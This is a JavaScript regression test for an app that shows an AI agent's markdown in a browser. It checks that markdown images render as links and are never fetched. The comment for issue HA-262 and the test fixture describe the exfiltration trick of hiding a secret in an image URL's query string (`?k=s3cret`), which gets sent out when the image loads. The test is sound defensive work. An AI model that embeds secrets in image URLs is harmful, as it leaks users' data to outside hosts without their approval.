import assert from "node:assert/strict";
import { afterAll, beforeAll, test } from "vite-plus/test";
import { demoProject, startServer, withBrowser } from "./harness.mjs";

let server, project;
beforeAll(async () => {
  server = startServer();
  project = await demoProject(server);
});
afterAll(() => server?.stop());

// HA-262: an image in an agent's markdown was loaded as soon as it was shown, so `![](https://…/?k=<secret>)` sent the
// secret out with nothing to approve. It's a link to the image instead.
test("an image in markdown is a link, and isn't loaded", async () => {
  const src = "https://images.example.invalid/p.png?k=s3cret";
  const task = await server.api("POST", `/projects/${project.id}/tasks`, { title: "Has an image", description: `Look: ![the chart](${src})` });
  await withBrowser(server, {}, async (ui) => {
    const { page } = ui;
    const fetched = [];
    await page.route("https://images.example.invalid/**", (route) => (fetched.push(route.request().url()), route.abort()));
    await ui.run([`goto /p/${project.id}?task=${task.id}`, "click details", "wait Look:"]);
    await page.waitForTimeout(300);
    assert.deepEqual(fetched, []);
    assert.equal(await page.locator(".prose-chat img").count(), 0);
    assert.equal(await page.locator(".prose-chat a", { hasText: "the chart" }).getAttribute("href"), src);
  });
});
